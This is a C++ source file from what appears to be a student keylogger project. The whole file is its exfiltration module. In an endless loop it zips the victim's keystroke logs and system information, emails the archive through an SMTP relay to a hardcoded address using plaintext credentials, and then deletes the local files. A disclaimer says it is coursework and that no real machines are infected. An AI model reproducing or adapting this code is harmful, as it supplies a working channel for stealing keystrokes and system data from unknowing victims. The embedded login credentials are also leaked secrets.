#include <cstring> 
#include <iostream>
#include <stdlib.h>
#include "EmailManager.h"
#include <curl/curl.h>
#include <locale>
#include <codecvt>
#include <stdio.h>

using namespace std;

#pragma warning(disable: 4996)

#define FROM    "<info@cybersecurity.com>"
#define TO      "<arnecools@hotmail.com>"
// #define FILENAME "c:/test.txt"
//#define FILENAME "mail.txt"

static const int CHARS = 76;
static const int ADD_SIZE = 16;
static const int SEND_BUF_SIZE = 54;
static char(*fileBuf)[CHARS] = NULL;
static const char cb64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

using namespace std;

bool LARGEFILE = false;
int status = 0;
int percent2 = 0;
int percent3 = 0;
int percent4 = 0;
int percent5 = 0;

string FILENAME = "";
string TargetuserName = "";

void LargeFilePercent(int rowcount)
{
    int percent = rowcount / 100;
    if (LARGEFILE == true) {
        status++;
        percent2++;
        if (percent2 == 18)
        {
            percent3++;
            percent2 = 0;
        }
        if (percent3 == percent)
        {
            percent4++;
            percent3 = 0;
        }
        if (percent4 == 10)
        {
            cout << "Larger Files take longer to encode, Please be patient." << endl
                << endl << "Encoding " + FILENAME + " please be patient..." << endl;
            cout << percent5 << "%";
            percent5 += 10;
            percent4 = 0;
        }
        if (status == 10000) {
            if (percent5 == 0) { cout << " 0%"; percent5 = 10; }
            cout << ".";
            status = 0;
        }
    }
}

void encodeblock(unsigned char in[3], unsigned char out[4], int len)
{
    out[0] = cb64[in[0] >> 2];
    out[1] = cb64[((in[0] & 0x03) << 4) | ((in[1] & 0xf0) >> 4)];
    out[2] = (unsigned char)(len > 1 ? cb64[((in[1] & 0x0f) << 2) | ((in[2] & 0xc0) >> 6)] : '=');
    out[3] = (unsigned char)(len > 2 ? cb64[in[2] & 0x3f] : '=');
}

void encode(FILE* infile, unsigned char* output_buf, int rowcount/*For Percent*/)
{
    unsigned char in[3], out[4];
    int i, len;
    *output_buf = 0;

    while (!feof(infile)) {
        len = 0;
        for (i = 0; i < 3; i++) {
            in[i] = (unsigned char)getc(infile);
            if (!feof(infile)) {
                len++;
            }
            else {
                in[i] = 0;
            }
        }
        if (len)
        {
            encodeblock(in, out, len);
            strncat((char*)output_buf, (char*)out, 4);
        }
        LargeFilePercent(rowcount);
    }
}


struct fileBuf_upload_status
{
    int lines_read;
};

size_t read_file()
{
    FILE* hFile = NULL;
    size_t fileSize(0), len(0), buffer_size(0);
    hFile = fopen(FILENAME.c_str(), "rb");
    if (!hFile)
    {
        cout << "File not found!!!" << endl;
        exit(EXIT_FAILURE);
    }
    fseek(hFile, 0, SEEK_END);
    fileSize = ftell(hFile);
    fseek(hFile, 0, SEEK_SET);
    if (fileSize > 256000)
    {
        cout << "Larger Files take longer to encode, Please be patient." << endl;
        LARGEFILE = true;
    }
    // cout << endl << "Encoding " + FILENAME + " please be patient..." << endl;
    int no_of_rows = fileSize / SEND_BUF_SIZE + 1;
    int charsize = (no_of_rows * 72) + (no_of_rows * 2);
    unsigned char* b64encode = new unsigned char[charsize];
    *b64encode = 0;
    encode(hFile, b64encode, no_of_rows);
    string encoded_buf = (char*)b64encode;
    if (LARGEFILE == true) cout << endl << endl;
    fileBuf = new char[ADD_SIZE + no_of_rows][CHARS];
    strcpy(fileBuf[len++], "To: " TO "\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "From: " FROM "\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    std::string subjectStr = "Subject: NEW LOGS FROM " + TargetuserName + "\r\n";
    strcpy(fileBuf[len++], subjectStr.c_str());
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "Content-Type: multipart/mixed;\r\n boundary=\"XXXXXMyBoundry\"\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "Mime-Version: 1.0\r\n\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "This is a multi-part message in MIME format.\r\n\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "--XXXXXMyBoundry\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "Content-Type: text/plain; charset=\"UTF-8\"\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "Bamboozled another target\r\nEnjoy!\r\n (This email is for a research project for the course cybersecurity) \r\n NO REAL COMPUTERS ARE INFECTED\r\n\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    strcpy(fileBuf[len++], "--XXXXXMyBoundry\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    std::string contentTypeStr = "Content-Type: application/x-msdownload; name=\"" + FILENAME + "\"\r\n";
    strcpy(fileBuf[len++], contentTypeStr.c_str());
    buffer_size += strlen(fileBuf[len - 1]);


    strcpy(fileBuf[len++], "Content-Transfer-Encoding: base64\r\n");
    buffer_size += strlen(fileBuf[len - 1]);
    std::string contentDispositionStr = "Content-Disposition: attachment; filename=bamboozled.zip\r\n";
    strcpy(fileBuf[len++], contentDispositionStr.c_str());
    buffer_size += strlen(fileBuf[len - 1]);
    strcpy(fileBuf[len++], "\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    int pos = 0;
    string sub_encoded_buf;
    for (int i = 0; i <= no_of_rows - 1; i++)
    {
        sub_encoded_buf = encoded_buf.substr(pos * 72, 72);
        sub_encoded_buf += "\r\n";
        strcpy(fileBuf[len++], sub_encoded_buf.c_str());
        buffer_size += sub_encoded_buf.size();
        pos++;
    }

    strcpy(fileBuf[len++], "\r\n--XXXXXMyBoundry--\r\n");
    buffer_size += strlen(fileBuf[len - 1]);

    delete[] b64encode;
    return buffer_size;
}
static size_t fileBuf_source(void* ptr, size_t size, size_t nmemb, void* userp)
{
    struct fileBuf_upload_status* upload_ctx = (struct fileBuf_upload_status*)userp;
    const char* fdata;

    if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1))
    {
        return 0;
    }

    fdata = fileBuf[upload_ctx->lines_read];

    if (strcmp(fdata, ""))
    {
        size_t len = strlen(fdata);
        memcpy(ptr, fdata, len);
        upload_ctx->lines_read++;
        return len;
    }
    return 0;
}

void sendMail()
{
    CURL* curl;
    CURLcode res = CURLE_OK;
    struct curl_slist* recipients = NULL;
    struct fileBuf_upload_status file_upload_ctx;
    size_t file_size(0);

    file_upload_ctx.lines_read = 0;

    curl = curl_easy_init();
    file_size = read_file();
    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_USERNAME, "arnecools@hotmail.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "LVa30Q75j9IU4mDR");
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp-relay.sendinblue.com:587");
        curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);
        recipients = curl_slist_append(recipients, TO);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        curl_easy_setopt(curl, CURLOPT_INFILESIZE, file_size);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, fileBuf_source);
        curl_easy_setopt(curl, CURLOPT_READDATA, &file_upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }
    delete[] fileBuf;
}


void startEmailManager(std::string userName) {
    std::wstring outPath = getOutFolder();
    std::wstring zipPath = outPath + L"\\bamboozled.zip";
    std::wstring keyLogsPath = outPath + L"\\keylogs.txt";
    std::wstring sysInfoPath = outPath + L"\\sysInfo.txt";

    // Convert wstring to string
        //setup converter
    using convert_type = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_type, wchar_t> converter;

    //use converter (.to_bytes: wstr->str, .from_bytes: str->wstr)
    FILENAME = converter.to_bytes(zipPath);
    TargetuserName = userName; 

    while (1)
    {
        Sleep(10000);
        HZIP hz = CreateZip(zipPath.c_str(), 0);

        // Add keylogs to zip
        ZipAdd(hz, _T("keylogs.txt"), keyLogsPath.c_str());

        // Add system information to zip
        ZipAdd(hz, _T("SystemInformation.txt"), sysInfoPath.c_str());
        
        // Add screen captures to zip
        // TODO

        // Add audio captures to zip
        // TODO

        // Add webcam captures to zip
        // TODO

        CloseZip(hz);

        // cout << FILENAME;
        sendMail();

        // REMOVE FILES
        _wremove(zipPath.c_str());
        _wremove(keyLogsPath.c_str());
        //_wremove(sysInfoPath.c_str());
    }
    
}